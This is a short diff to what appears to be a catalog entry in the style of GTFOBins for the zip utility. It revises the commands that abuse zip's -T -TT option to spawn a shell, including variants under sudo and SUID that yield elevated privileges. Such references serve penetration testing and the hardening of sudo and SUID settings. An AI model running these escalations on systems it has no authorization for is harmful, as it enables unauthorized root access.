@@ -1,11 +1,15 @@
 ---
 functions:
   execute-interactive:
-    - code: echo "/bin/sh" > /tmp/run.sh
-            chmod +x /tmp/run.sh
-            zip z.zip * -T -TT /tmp/run.sh
+    - code: |
+        zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
+        rm /tmp/x.zip
   sudo-enabled:
-    - code: echo "/bin/sh" > /tmp/run.sh
-            chmod +x /tmp/run.sh
-            sudo zip z.zip * -T -TT /tmp/run.sh
+    - code: |
+        sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
+        sudo rm /tmp/x.zip
+  suid-limited:
+    - code: |
+        ./zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
+        sudo rm /tmp/x.zip
 ---
